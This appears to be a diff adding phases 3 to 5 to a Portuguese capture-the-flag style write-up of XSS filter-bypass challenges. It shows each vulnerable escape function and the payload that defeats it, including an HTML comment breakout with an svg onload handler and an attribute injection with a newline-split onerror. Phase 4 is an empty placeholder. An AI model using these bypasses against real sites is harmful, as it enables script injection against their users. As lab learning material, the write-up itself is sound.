@@ -83,7 +83,70 @@ Por que funciona?
 
 `<svg>`: Utilizado como uma "camuflagem", na qual a tag é permitida pelo navegador, ativando o modo SVG e dentro dele, é possivel rodar o <script> normalmente.
 
-`prompt&#40;1)`: O `&#40;` é decodificado pelo navegador como ( , com base no  [HTML entities](https://www.freeformatter.com/html-entities.html)
+`prompt&#40;1)`: O `&#40;` é decodificado pelo navegador como ( , com base no  [HTML entities](https://www.freeformatter.com/html-entities.html).
+
+### Fase 3
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/->/g, '_');
+
+    // comment the input to avoid script execution
+    return '<!-- ' + input + ' -->';
+}        
+```
+Nesse código, a função de escape adiciona o input dentro de um comentário HTML, evitando a execução de scripts maliciosos, substituindo `->`por `_`.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+--!><svg onload=prompt(1)
+```
+
+Por que funciona?
+
+`--!>`: Como o código não aceita ->, é preciso fechar o comentário para depois o payload ser executado.
+
+### Fase 4
+Este é o código dado:
+
+```bash
+
+       
+```
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+
+```
+
+Por que funciona?
+
+### Fase 5
+Este é o código dado:
+
+```bash
+function escape(input) {
+    // apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '<input value="' + input + '" type="text">';
+}            
+```
+Este código, impede de gerar tags devido o bloqueio do `>`, bloqueia também qualquer atributo de evento como o anload=, onclick=, onerror=, devido o `on.+?`, além de bloquear a palavra `focus`.
+
+Para explorarmos essa vulnerabilidade usaremos:
+
+```bash
+"type=image src onerror
+="prompt(1)
+```
+
+Por que funciona?
+
 
 &#112; → p
 
